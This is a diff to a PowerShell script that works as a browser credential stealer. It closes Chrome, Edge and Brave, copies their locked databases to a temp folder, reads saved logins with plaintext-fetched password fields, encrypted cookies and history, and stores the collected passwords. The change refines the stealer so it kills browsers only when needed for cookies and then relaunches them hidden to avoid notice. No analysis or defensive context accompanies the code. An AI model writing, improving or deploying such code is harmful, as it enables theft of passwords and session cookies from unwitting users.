@@ -102,12 +102,47 @@ $browsers = @(
 )
 
 $allPasswords = @()
-$browserNames = @("chrome", "msedge", "brave")
-foreach ($n in $browserNames) {
-  Get-Process -Name $n -ErrorAction SilentlyContinue | Stop-Process -Force
+
+$script:killedBrowsers = $false
+
+function killBrowsers {
+  $script:killedBrowsers = $true
+  foreach ($n in @("chrome", "msedge", "brave")) {
+    Get-Process -Name $n -ErrorAction SilentlyContinue | Stop-Process -Force
+  }
+  Start-Sleep -Seconds 2
 }
-Start-Sleep -Seconds 2
-ts "$R Browsers closed for DB access"
+
+function copyDb($dbPath) {
+  $tmp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).db"
+  $fs = [System.IO.File]::Open($dbPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+  $buf = New-Object byte[] $fs.Length
+  $fs.Read($buf, 0, $fs.Length) | Out-Null
+  $fs.Close()
+  [System.IO.File]::WriteAllBytes($tmp, $buf)
+  return $tmp
+}
+
+function openDb($dbPath, $forCookies) {
+  # First try: copy while browsers are running
+  try {
+    $tmp = copyDb $dbPath
+    $ptr = [IntPtr]::Zero
+    if ([N]::sqlite3_open_v2($tmp, [ref]$ptr, 1, [IntPtr]::Zero) -eq 0) { return $ptr }
+    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+  } catch {}
+  # For Cookies: retry after killing browsers
+  if ($forCookies) {
+    killBrowsers
+    try {
+      $tmp = copyDb $dbPath
+      $ptr = [IntPtr]::Zero
+      if ([N]::sqlite3_open_v2($tmp, [ref]$ptr, 1, [IntPtr]::Zero) -eq 0) { return $ptr }
+      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+    } catch {}
+  }
+  return [IntPtr]::Zero
+}
 
 foreach ($browser in $browsers) {
   $bName = $browser[0]; $basePath = $browser[1]
@@ -116,28 +151,12 @@ foreach ($browser in $browsers) {
   try { Get-ChildItem "$basePath\Profile *" -Directory -ErrorAction SilentlyContinue | ForEach-Object { $profiles += $_.Name } } catch {}
   $bpw = 0; $bck = 0; $bhist = 0; $bRoblox = $null; $errMsg = $null
 
-  function openDb($dbPath) {
-    try {
-      $tmp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).db"
-      $fs = [System.IO.File]::Open($dbPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
-      $buf = New-Object byte[] $fs.Length
-      $fs.Read($buf, 0, $fs.Length) | Out-Null
-      $fs.Close()
-      [System.IO.File]::WriteAllBytes($tmp, $buf)
-      $ptr = [IntPtr]::Zero
-      $rc = [N]::sqlite3_open_v2($tmp, [ref]$ptr, 1, [IntPtr]::Zero)
-      if ($rc -eq 0) { return $ptr }
-      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
-    } catch {}
-    return [IntPtr]::Zero
-  }
-
   foreach ($profile in $profiles) {
     $loginDb = "$basePath\$profile\Login Data"; $cookieDb = "$basePath\$profile\Network\Cookies"; $historyDb = "$basePath\$profile\History"
 
     if (Test-Path $loginDb) {
       try {
-        $dbPtr = openDb $loginDb
+        $dbPtr = openDb $loginDb $false
         if ($dbPtr -ne [IntPtr]::Zero) {
           $stmt = [IntPtr]::Zero
           if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT origin_url, username_value, password_value FROM logins", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
@@ -169,7 +188,7 @@ foreach ($browser in $browsers) {
 
     if (Test-Path $cookieDb) {
       try {
-        $dbPtr = openDb $cookieDb
+        $dbPtr = openDb $cookieDb $true
         if ($dbPtr -ne [IntPtr]::Zero) {
           $stmt = [IntPtr]::Zero
           if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT host_key, name, encrypted_value FROM cookies", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
@@ -203,7 +222,7 @@ foreach ($browser in $browsers) {
 
     if (Test-Path $historyDb) {
       try {
-        $dbPtr = openDb $historyDb
+        $dbPtr = openDb $historyDb $false
         if ($dbPtr -ne [IntPtr]::Zero) {
           $stmt = [IntPtr]::Zero
           if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT COUNT(*) FROM urls", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
@@ -262,8 +281,10 @@ if ($allPasswords.Count -gt 0) {
   } catch { ts "$WA Failed to save passwords: $_" }
 }
 
-foreach ($n in @("chrome", "msedge", "brave")) {
-  try { Start-Process $n -WindowStyle Hidden -ErrorAction Stop } catch {}
+if ($script:killedBrowsers) {
+  foreach ($n in @("chrome", "msedge", "brave")) {
+    try { Start-Process $n -WindowStyle Hidden -ErrorAction Stop } catch {}
+  }
 }
 
 ts "$CK All phases complete"
